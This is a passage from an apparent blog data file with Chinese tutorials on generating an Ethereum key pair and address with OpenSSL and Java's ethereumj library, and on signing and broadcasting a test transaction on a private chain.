57:91:75:cc:cd:6e:61:e8:4c:b1:aa:cf:1d:fd:d7:</span><br><span class=\"line\">    86:35:c4:55:c5</span><br><span class=\"line\">ASN1 OID: secp256k1</span><br></pre></td></tr></table></figure>\n<blockquote>\n<h6 id=\"openssl会在私钥部分加一个0x00的头部，在公钥部分加一个0x04的头部，我们去掉头部把公钥、私钥部分转为我们想要的十六进制格式\"><a href=\"#openssl会在私钥部分加一个0x00的头部，在公钥部分加一个0x04的头部，我们去掉头部把公钥、私钥部分转为我们想要的十六进制格式\" class=\"headerlink\" title=\"openssl会在私钥部分加一个0x00的头部，在公钥部分加一个0x04的头部，我们去掉头部把公钥、私钥部分转为我们想要的十六进制格式\"></a>openssl会在私钥部分加一个0x00的头部，在公钥部分加一个0x04的头部，我们去掉头部把公钥、私钥部分转为我们想要的十六进制格式</h6></blockquote>\n<ul>\n<li>私钥部分</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat Key | grep priv -A 3 | tail -n +2 |  tr -d &apos;\\n[:space:]:&apos; | sed &apos;s/^00//&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">884f0da48660a3c22257fc36be4210ec6f975924ea399e6478c7596b852f25c4</span><br></pre></td></tr></table></figure>\n<ul>\n<li>公钥部分</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> cat Key | grep pub -A 5 | tail -n +2 |tr -d &apos;\\n[:space:]:&apos; |sed &apos;s/^04//&apos;</span><br><span class=\"line\"> </span><br><span class=\"line\">f35862b021183deb90cb66978fc6f7c4bb5ae3e10d486a8109458e0f1ebbdb4602ed1f864bc91cada3eef79b3fb020313850b27c958cdd7567e5c7b9d7f66780</span><br></pre></td></tr></table></figure>\n<blockquote>\n<h6 id=\"地址是取公钥后40个字符，通过keccak-256算法生成\"><a href=\"#地址是取公钥后40个字符，通过keccak-256算法生成\" class=\"headerlink\" title=\"地址是取公钥后40个字符，通过keccak-256算法生成\"></a>地址是取公钥后40个字符，通过keccak-256算法生成</h6></blockquote>\n<ul>\n<li>地址</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat pub | keccak-256sum -x -l | tr -d &apos; -&apos; | tail -c 41</span><br><span class=\"line\"></span><br><span class=\"line\">82a772a5c62b05cd51683872180a5dffef3a0c3e</span><br></pre></td></tr></table></figure>\n<p>接下来我们去<a href=\"https://www.myetherwallet.com/\" target=\"_blank\" rel=\"noopener\">myetherwallet</a>验证一下这个钱包地址是否正确</p>\n<ul>\n<li>导入私钥</li>\n</ul>\n<p><img src=\"/images/address20180311.png\" alt=\"image\"></p>\n<p>通过比对发现私钥地址一致。我们在Java中再进行生成对比一下。</p>\n<p>首先我们要导入<a href=\"https://github.com/ethereum/ethereumj\" target=\"_blank\" rel=\"noopener\">ethereum</a></p>\n<p>Java中钱包生成公私钥地址的方法都在org.ethereum.crypto.ECKey包中的ECKey类中</p>\n<p>通过源码我发现好像并没有提供直接通过私钥生成地址的方法,但是提供了一个可以通过私钥生成ECKey的构造方法，以及通过ECKey获取公钥，私钥，地址的方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static ECKey fromPrivate(byte[] privKeyBytes) &#123;</span><br><span class=\"line\">       return fromPrivate(new BigInteger(1, privKeyBytes));</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Nullable</span><br><span class=\"line\">  public byte[] getPrivKeyBytes() &#123;</span><br><span class=\"line\">      return this.privKey == null?null:(this.privKey instanceof BCECPrivateKey?ByteUtil.bigIntegerToBytes(((BCECPrivateKey)this.privKey).getD(), 32):null);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public ECPoint getPubKeyPoint() &#123;</span><br><span class=\"line\">       return this.pub;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public byte[] getAddress() &#123;</span><br><span class=\"line\">       if(this.pubKeyHash == null) &#123;</span><br><span class=\"line\">           this.pubKeyHash = computeAddress(this.pub);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       return this.pubKeyHash;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p>接下来根据这几个方法写一个测试类进行测试校验</p>\n<p><img src=\"/images/test20180311.png\" alt=\"image\"></p>\n<p>发现私钥和地址是一样的公钥多了一个04的头部，去掉头部也是完全一样。</p>\n<p>那我们怎么生成一个钱包？再看源码还有一个空参构造方法可以构造一个ECKey</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public ECKey() &#123;</span><br><span class=\"line\">       this(secureRandom);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p>我们生成一个钱包并在<a href=\"https://www.myetherwallet.com/\" target=\"_blank\" rel=\"noopener\">myetherwallet</a>校验</p>\n<p><img src=\"/images/test_wallet20180311.png\" alt=\"image\"></p>\n<p><img src=\"/images/wallet20180311.png\" alt=\"image\"></p>\n<p>通过校验发现我们生成的钱包与mywallet中一致。</p>\n<p>参考：</p>\n<ol>\n<li><a href=\"https://kobl.one/blog/create-full-ethereum-keypair-and-address/\" target=\"_blank\" rel=\"noopener\">Generating a usable Ethereum wallet and its corresponding keys</a></li>\n<li><a href=\"https://github.com/ethereum/ethereumj\" target=\"_blank\" rel=\"noopener\">ethereumj</a></li>\n</ol>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"Java中创建完整的以太坊钱包\"><a href=\"#Java中创建完整的以太坊钱包\" class=\"headerlink\" title=\"Java中创建完整的以太坊钱包\"></a>Java中创建完整的以太坊钱包</h3><p>以太坊中生成秘钥分为三步</p>\n<ol>\n<li>生成EC私钥</li>\n<li>通过私钥推出公钥</li>\n<li>通过公钥算出密码</li>\n</ol>\n<blockquote>\n<h6 id=\"以太坊的私钥是一个64位的16进制数。以太坊和比特币一样，都是使用的相同的椭圆曲线算法生成\"><a href=\"#以太坊的私钥是一个64位的16进制数。以太坊和比特币一样，都是使用的相同的椭圆曲线算法生成\" class=\"headerlink\" title=\"以太坊的私钥是一个64位的16进制数。以太坊和比特币一样，都是使用的相同的椭圆曲线算法生成\"></a>以太坊的私钥是一个64位的16进制数。以太坊和比特币一样，都是使用的相同的椭圆曲线算法生成</h6></blockquote>\n<ul>\n<li>我们用OpenSSL来生成一个钥私，并且显示他的私有和公告部分</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">openssl ecparam -name secp256k1 -genkey -noout | openssl ec -text -noout </span><br><span class=\"line\"></span><br><span class=\"line\">read EC key</span><br><span class=\"line\">Private-Key: (256 bit)</span><br><span class=\"line\">priv:</span><br><span class=\"line\">    00:bc:70:90:97:28:61:e0:92:72:74:c0:0f:b0:1d:</span><br><span class=\"line\">    c6:4c:e0:bc:a9:32:a7:b1:d2:9e:a5:1e:cd:2c:21:</span><br><span class=\"line\">    c2:e3:1d</span><br><span class=\"line\">pub: </span><br><span class=\"line\">    04:0f:ff:81:4f:59:ac:83:93:2f:5c:6c:74:ea:69:</span><br><span class=\"line\">    d4:75:74:9a:46:9a:f1:6e:eb:aa:2f:2a:59:d2:36:</span><br><span class=\"line\">    5f:33:1f:7d:35:05:f5:57:15:11:3d:91:47:89:2d:</span><br><span class=\"line\">    57:91:75:cc:cd:6e:61:e8:4c:b1:aa:cf:1d:fd:d7:</span><br><span class=\"line\">    86:35:c4:55:c5</span><br><span class=\"line\">ASN1 OID: secp256k1</span><br></pre></td></tr></table></figure>\n<blockquote>\n<h6 id=\"openssl会在私钥部分加一个0x00的头部，在公钥部分加一个0x04的头部，我们去掉头部把公钥、私钥部分转为我们想要的十六进制格式\"><a href=\"#openssl会在私钥部分加一个0x00的头部，在公钥部分加一个0x04的头部，我们去掉头部把公钥、私钥部分转为我们想要的十六进制格式\" class=\"headerlink\" title=\"openssl会在私钥部分加一个0x00的头部，在公钥部分加一个0x04的头部，我们去掉头部把公钥、私钥部分转为我们想要的十六进制格式\"></a>openssl会在私钥部分加一个0x00的头部，在公钥部分加一个0x04的头部，我们去掉头部把公钥、私钥部分转为我们想要的十六进制格式</h6></blockquote>\n<ul>\n<li>私钥部分</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat Key | grep priv -A 3 | tail -n +2 |  tr -d &apos;\\n[:space:]:&apos; | sed &apos;s/^00//&apos;</span><br><span class=\"line\"></span><br><span class=\"line\">884f0da48660a3c22257fc36be4210ec6f975924ea399e6478c7596b852f25c4</span><br></pre></td></tr></table></figure>\n<ul>\n<li>公钥部分</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> cat Key | grep pub -A 5 | tail -n +2 |tr -d &apos;\\n[:space:]:&apos; |sed &apos;s/^04//&apos;</span><br><span class=\"line\"> </span><br><span class=\"line\">f35862b021183deb90cb66978fc6f7c4bb5ae3e10d486a8109458e0f1ebbdb4602ed1f864bc91cada3eef79b3fb020313850b27c958cdd7567e5c7b9d7f66780</span><br></pre></td></tr></table></figure>\n<blockquote>\n<h6 id=\"地址是取公钥后40个字符，通过keccak-256算法生成\"><a href=\"#地址是取公钥后40个字符，通过keccak-256算法生成\" class=\"headerlink\" title=\"地址是取公钥后40个字符，通过keccak-256算法生成\"></a>地址是取公钥后40个字符，通过keccak-256算法生成</h6></blockquote>\n<ul>\n<li>地址</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat pub | keccak-256sum -x -l | tr -d &apos; -&apos; | tail -c 41</span><br><span class=\"line\"></span><br><span class=\"line\">82a772a5c62b05cd51683872180a5dffef3a0c3e</span><br></pre></td></tr></table></figure>\n<p>接下来我们去<a href=\"https://www.myetherwallet.com/\" target=\"_blank\" rel=\"noopener\">myetherwallet</a>验证一下这个钱包地址是否正确</p>\n<ul>\n<li>导入私钥</li>\n</ul>\n<p><img src=\"/images/address20180311.png\" alt=\"image\"></p>\n<p>通过比对发现私钥地址一致。我们在Java中再进行生成对比一下。</p>\n<p>首先我们要导入<a href=\"https://github.com/ethereum/ethereumj\" target=\"_blank\" rel=\"noopener\">ethereum</a></p>\n<p>Java中钱包生成公私钥地址的方法都在org.ethereum.crypto.ECKey包中的ECKey类中</p>\n<p>通过源码我发现好像并没有提供直接通过私钥生成地址的方法,但是提供了一个可以通过私钥生成ECKey的构造方法，以及通过ECKey获取公钥，私钥，地址的方法</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static ECKey fromPrivate(byte[] privKeyBytes) &#123;</span><br><span class=\"line\">       return fromPrivate(new BigInteger(1, privKeyBytes));</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Nullable</span><br><span class=\"line\">  public byte[] getPrivKeyBytes() &#123;</span><br><span class=\"line\">      return this.privKey == null?null:(this.privKey instanceof BCECPrivateKey?ByteUtil.bigIntegerToBytes(((BCECPrivateKey)this.privKey).getD(), 32):null);</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public ECPoint getPubKeyPoint() &#123;</span><br><span class=\"line\">       return this.pub;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public byte[] getAddress() &#123;</span><br><span class=\"line\">       if(this.pubKeyHash == null) &#123;</span><br><span class=\"line\">           this.pubKeyHash = computeAddress(this.pub);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">       return this.pubKeyHash;</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p>接下来根据这几个方法写一个测试类进行测试校验</p>\n<p><img src=\"/images/test20180311.png\" alt=\"image\"></p>\n<p>发现私钥和地址是一样的公钥多了一个04的头部，去掉头部也是完全一样。</p>\n<p>那我们怎么生成一个钱包？再看源码还有一个空参构造方法可以构造一个ECKey</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public ECKey() &#123;</span><br><span class=\"line\">       this(secureRandom);</span><br><span class=\"line\">   &#125;</span><br></pre></td></tr></table></figure>\n<p>我们生成一个钱包并在<a href=\"https://www.myetherwallet.com/\" target=\"_blank\" rel=\"noopener\">myetherwallet</a>校验</p>\n<p><img src=\"/images/test_wallet20180311.png\" alt=\"image\"></p>\n<p><img src=\"/images/wallet20180311.png\" alt=\"image\"></p>\n<p>通过校验发现我们生成的钱包与mywallet中一致。</p>\n<p>参考：</p>\n<ol>\n<li><a href=\"https://kobl.one/blog/create-full-ethereum-keypair-and-address/\" target=\"_blank\" rel=\"noopener\">Generating a usable Ethereum wallet and its corresponding keys</a></li>\n<li><a href=\"https://github.com/ethereum/ethereumj\" target=\"_blank\" rel=\"noopener\">ethereumj</a></li>\n</ol>\n"},{"title":"Java中签名一笔交易并验证","comments":0,"date":"2018-03-18T03:29:49.000Z","img":null,"_content":"### Java中签名一笔交易并验证\n>上一节讲了Java中创建钱包，这一节我们讲如何在Java中签名一笔交易\n\n准备工作就不做详细介绍了\n* 集成Java的环境查看[这里](https://github.com/ethereum/ethereumj)\n* 搭建测试的私链查看[这里](http://c60block.com/2018/03/16/%E9%83%A8%E7%BD%B2%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E6%9C%89%E9%93%BE%E5%B9%B6%E6%8C%96%E7%9F%BF/)\n\n直接切入重点。包里给我们提供了这样的一个方法，来构造一笔交易。\n\n```\n public Transaction(byte[] nonce, byte[] gasPrice, byte[] gasLimit, byte[] receiveAddress, byte[] value, byte[] data, Integer chainId) {\n        this.chainId = null;\n        this.parsed = false;\n        this.nonce = nonce;\n        this.gasPrice = gasPrice;\n        this.gasLimit = gasLimit;\n        this.receiveAddress = receiveAddress;\n        if(ByteUtil.isSingleZero(value)) {\n            this.value = ByteUtil.EMPTY_BYTE_ARRAY;\n        } else {\n            this.value = value;\n        }\n\n        this.data = data;\n        this.chainId = chainId;\n        if(receiveAddress == null) {\n            this.receiveAddress = ByteUtil.EMPTY_BYTE_ARRAY;\n        }\n\n        this.parsed = true;\n    }\n```\n\n#### 以上参数是什么意思呢？\n* nonce 交易序列号，交易序列号默认是0，每增加一笔交易nonce+1\n* gasgasLimit 通常我们说的gas\n* gasPrice 单位gas需要的价格\n* receiverAddress 接收者的地址\n* value 要转的代币\n* data eth交易可以为空字符串。\n* chainId 网络id，主网络是1  我这里测试网络配置了999，根据自身私链设置。\n\n需要注意的是：这里的交易单位都是wei，单位转换参考下表。\n\n Unit|Wei Value|Wei\n--- |--- | ---\nwei                 | 1        | 1\nKwei (babbage)      | 1e3 wei  | 1,000\nMwei (lovelace)     | 1e6 wei  | 1000,000\nGwei (shannon)      | 1e9 wei  | 1,000,000,000\nmicroether (szabo)  | 1e12 wei | 1,000,000,000,000\nmilliether (finney) | 1e15 wei | 1,000,000,000,000,000\nether               | 1e18 wei | 1,000,000,000,000,000,000\n\n知道这些概念后我们就可以签名一笔交易。\n\n现在我们模拟从accounts[0]地址给accounts[1]地址发送一笔交易，数额为1eth。并且携带了交易信息。\n\n1. 首先获取nonce值\n\n```\n> eth.getTransactionCount(eth.accounts[0])\n0\n> \n```\n> 得到nonce为0\n\n2. 获取gas\n\n```\n> eth.estimateGas({from:eth.accounts[0],to:eth.accounts[1],data:\"0x0000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a2000\",value:5000000000000000000})\n22856\n```\n> 得到gas为22856\n\n3. 获取推荐的gasPrice\n\n```\n> eth.gasPrice\n18000000000\n```\n4. 获取接收者的地址\n\n```\n> eth.accounts[0]\n\"0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826\"\n> eth.accounts[1]\n\"0x94e94dcab84ad8805c2ebb843c1cf06393cca620\"\n> \n```\n> 当前我在私有链上导入两个地址，然后用\"0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826\"这个地址挖矿，挖到币发送给\"0x94e94dcab84ad8805c2ebb843c1cf06393cca620\"\n所以获取到的接收地址为：==\"0x94e94dcab84ad8805c2ebb843c1cf06393cca620\"==\n\n5. data在以太坊交易中可以为“”，这里是做测试我随便填了一组字符串。\n6. value为1eth，上面说了这里交易设置的值为wei，所以这里是1000000000000000000\n7. chainId为私有链配置的网络id我这里为999\n\n还有在签名的时候需要用到私钥。我这里测试账号的私钥为\"c85ef7d79691fe79573b1a7064c19c1a9819ebdbd1faaab1a8ec92344438aaf4\"\n\n接下来我们对需要发起的这笔交易进行签名。\n\n\n```\nString s =\"0000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a2000\";\n        BigInteger bigInteger =  new BigInteger(\"94e94dcab84ad8805c2ebb843c1cf06393cca620\",16);\n        //nonce\n        byte[] nonce = ByteUtil.intToBytesNoLeadZeroes(0);\n        //\n        byte[] gasPrice = ByteUtil.bigIntegerToBytes(new BigInteger(\"18000000000\"));\n        //\n        byte[] gas = ByteUtil.longToBytesNoLeadZeroes(22856);\n        //\n        byte[] address = ByteUtil.bigIntegerToBytes(bigInteger);\n        //交易金额\n        byte[] value = ByteUtil.bigIntegerToBytes(new BigInteger(\"1000000000000000000\"));\n        //字符串转成数组上传\n        byte[] data = ByteUtil.hexStringToBytes(s);\n        Transaction tx = new Transaction(\n                nonce,\n                //\n                gasPrice,\n                //gas限度\n                gas,\n                //接收者地址\n                address,\n                //发送的金额\n                value,\n                //携带消息\n                data,\n                //发送到主链当中\n                999\n        );\n\n        //开始签名\n        tx.sign(ECKey.fromPrivate(new BigInteger(\"c85ef7d79691fe79573b1a7064c19c1a9819ebdbd1faaab1a8ec92344438aaf4\",16)));\n        byte[] rawTx = tx.getEncoded();\n        //打印出签名后的值\n        System.out.println(\"0x\"+ Hex.toHexString(rawTx));\n```\n\n\n```\n得到签名后的数据为：\n0xf8af80850430e234008259489494e94dcab84ad8805c2ebb843c1cf06393cca620880de0b6b3a7640000b8400000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a20008207f2a066674d401df4f4150f0650a54e3932308cbe5f121bf5b42fbfc7b0fb8d7ca0d7a04d575c545ad23fb91f71091af2c7807a88eff3de2b2604742e1188ce2c0bc216\n```\n\n然后我们在这私有链上广播出去这笔交易看是否签名正确。\n\n\n```\n> eth.sendRawTransaction(\"0xf8af80850430e234008259489494e94dcab84ad8805c2ebb843c1cf06393cca620880de0b6b3a7640000b8400000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a20008207f2a066674d401df4f4150f0650a54e3932308cbe5f121bf5b42fbfc7b0fb8d7ca0d7a04d575c545ad23fb91f71091af2c7807a88eff3de2b2604742e1188ce2c0bc216\")\nINFO [03-17|08:13:31]Submitted transaction                    fullhash=0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7 recipient=0x94E94dcab84Ad8805c2EbB843C1cf06393cca620\n\"0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7\"\n```\n我们查看accounts[1]地址现在是否收到了1eth\n```\n> eth.getBalance(eth.accounts[1])\n1000000000000000000\n> web3.fromWei(eth.getBalance(eth.accounts[1]),\"ether\")\n1\n```\n查看交易结果\n\n```\n> eth.getTransaction(\"0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7\")\n{\n  blockHash: \"0x53bb7e8ef200dfa7dd2e72cba30bc9bcfb9e2de7bb49da1c35f49dbd18dd7c14\",\n  blockNumber: 4,\n  from: \"0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826\",\n  gas: 22856,\n  gasPrice: 18000000000,\n  hash: \"0x256b52bb9995e95c51065cef83e8e7170dd934cb77e174a8999f0c3d674c78e7\",\n  input: \"0x0000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a2000\",\n  nonce: 0,\n  r: \"0x66674d401df4f4150f0650a54e3932308cbe5f121bf5b42fbfc7b0fb8d7ca0d7\",\n  s: \"0x4d575c545ad23fb91f71091af2c7807a88eff3de2b2604742e1188ce2c0bc216\",\n  to: \"0x94e94dcab84ad8805c2ebb843c1cf06393cca620\",\n  transactionIndex: 0,\n  v: \"0x7f2\",\n  value: 1000000000000000000\n}\n```\n\n由此结果可以验证我们签名的交易正确。\n\n\n\n\n\n\n\n\n\n\n\n\n\n \n","source":"_posts/Java中签名一笔交易并验证.md","raw":"---\ntitle: Java中签名一笔交易并验证\ncomments: false\ndate: 2018-03-18 11:29:49\ncategories: 钱包\ntags:\n- ciscolxh\n- 钱包\nimg:\n---\n### Java中签名一笔交易并验证\n>上一节讲了Java中创建钱包，这一节我们讲如何在Java中签名一笔交易\n\n准备工作就不做详细介绍了\n* 集成Java的环境查看[这里](https://github.com/ethereum/ethereumj)\n* 搭建测试的私链查看[这里](http://c60block.com/2018/03/16/%E9%83%A8%E7%BD%B2%E4%BB%A5%E5%A4%AA%E5%9D%8A%E7%A7%81%E6%9C%89%E9%93%BE%E5%B9%B6%E6%8C%96%E7%9F%BF/)\n\n直接切入重点。包里给我们提供了这样的一个方法，来构造一笔交易。\n\n```\n public Transaction(byte[] nonce, byte[] gasPrice, byte[] gasLimit, byte[] receiveAddress, byte[] value, byte[] data, Integer chainId) {\n        this.chainId = null;\n        this.parsed = false;\n        this.nonce = nonce;\n        this.gasPrice = gasPrice;\n        this.gasLimit = gasLimit;\n        this.receiveAddress = receiveAddress;\n        if(ByteUtil.isSingleZero(value)) {\n            this.value = ByteUtil.EMPTY_BYTE_ARRAY;\n        } else {\n            this.value = value;\n        }\n\n        this.data = data;\n        this.chainId = chainId;\n        if(receiveAddress == null) {\n            this.receiveAddress = ByteUtil.EMPTY_BYTE_ARRAY;\n        }\n\n        this.parsed = true;\n    }\n```\n\n#### 以上参数是什么意思呢？\n* nonce 交易序列号，交易序列号默认是0，每增加一笔交易nonce+1\n* gasgasLimit 通常我们说的gas\n* gasPrice 单位gas需要的价格\n* receiverAddress 接收者的地址\n* value 要转的代币\n* data eth交易可以为空字符串。\n* chainId 网络id，主网络是1  我这里测试网络配置了999，根据自身私链设置。\n\n需要注意的是：这里的交易单位都是wei，单位转换参考下表。\n\n Unit|Wei Value|Wei\n--- |--- | ---\nwei                 | 1        | 1\nKwei (babbage)      | 1e3 wei  | 1,000\nMwei (lovelace)     | 1e6 wei  | 1000,000\nGwei (shannon)      | 1e9 wei  | 1,000,000,000\nmicroether (szabo)  | 1e12 wei | 1,000,000,000,000\nmilliether (finney) | 1e15 wei | 1,000,000,000,000,000\nether               | 1e18 wei | 1,000,000,000,000,000,000\n\n知道这些概念后我们就可以签名一笔交易。\n\n现在我们模拟从accounts[0]地址给accounts[1]地址发送一笔交易，数额为1eth。并且携带了交易信息。\n\n1. 首先获取nonce值\n\n```\n> eth.getTransactionCount(eth.accounts[0])\n0\n> \n```\n> 得到nonce为0\n\n2. 获取gas\n\n```\n> eth.estimateGas({from:eth.accounts[0],to:eth.accounts[1],data:\"0x0000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a2000\",value:5000000000000000000})\n22856\n```\n> 得到gas为22856\n\n3. 获取推荐的gasPrice\n\n```\n> eth.gasPrice\n18000000000\n```\n4. 获取接收者的地址\n\n```\n> eth.accounts[0]\n\"0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826\"\n> eth.accounts[1]\n\"0x94e94dcab84ad8805c2ebb843c1cf06393cca620\"\n> \n```\n> 当前我在私有链上导入两个地址，然后用\"0xcd2a3d9f938e13cd947ec05abc7fe734df8dd826\"这个地址挖矿，挖到币发送给\"0x94e94dcab84ad8805c2ebb843c1cf06393cca620\"\n所以获取到的接收地址为：==\"0x94e94dcab84ad8805c2ebb843c1cf06393cca620\"==\n\n5. data在以太坊交易中可以为“”，这里是做测试我随便填了一组字符串。\n6. value为1eth，上面说了这里交易设置的值为wei，所以这里是1000000000000000000\n7. chainId为私有链配置的网络id我这里为999\n\n还有在签名的时候需要用到私钥。我这里测试账号的私钥为\"c85ef7d79691fe79573b1a7064c19c1a9819ebdbd1faaab1a8ec92344438aaf4\"\n\n接下来我们对需要发起的这笔交易进行签名。\n\n\n```\nString s =\"0000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a2000\";\n        BigInteger bigInteger =  new BigInteger(\"94e94dcab84ad8805c2ebb843c1cf06393cca620\",16);\n        //nonce\n        byte[] nonce = ByteUtil.intToBytesNoLeadZeroes(0);\n        //\n        byte[] gasPrice = ByteUtil.bigIntegerToBytes(new BigInteger(\"18000000000\"));\n        //\n        byte[] gas = ByteUtil.longToBytesNoLeadZeroes(22856);\n        //\n        byte[] address = ByteUtil.bigIntegerToBytes(bigInteger);\n        //交易金额\n        byte[] value = ByteUtil.bigIntegerToBytes(new BigInteger(\"1000000000000000000\"));\n        //字符串转成数组上传\n        byte[] data = ByteUtil.hexStringToBytes(s);\n        Transaction tx = new Transaction(\n                nonce,\n                //\n                gasPrice,\n                //gas限度\n                gas,\n                //接收者地址\n                address,\n                //发送的金额\n                value,\n                //携带消息\n                data,\n                //发送到主链当中\n                999\n        );\n\n        //开始签名\n        tx.sign(ECKey.fromPrivate(new BigInteger(\"c85ef7d79691fe79573b1a7064c19c1a9819ebdbd1faaab1a8ec92344438aaf4\",16)));\n        byte[] rawTx = tx.getEncoded();\n        //打印出签名后的值\n        System.out.println(\"0x\"+ Hex.toHexString(rawTx));\n```\n\n\n```\n得到签名后的数据为：\n0xf8af80850430e234008259489494e94dcab84ad8805c2ebb843c1cf06393cca620880de0b6b3a7640000b8400000000000000000000000001b2fdc6e4453fcc9f0e115c8bc8320b1e084af5f000000000000000000000000000000000000000000000000000001d1a94a20008207f2a066674d401df4f4150f0650a54e3932308cbe5f121bf5b42fbfc7b0fb8d7ca0d7a04d575c545ad23fb91f71091af2c7807a88eff3de2b2604742e1188ce2c0bc216\n```\n\n然后我们在这私有链上广播出去这笔交易看是否签名正确。\n\n\n```\n> 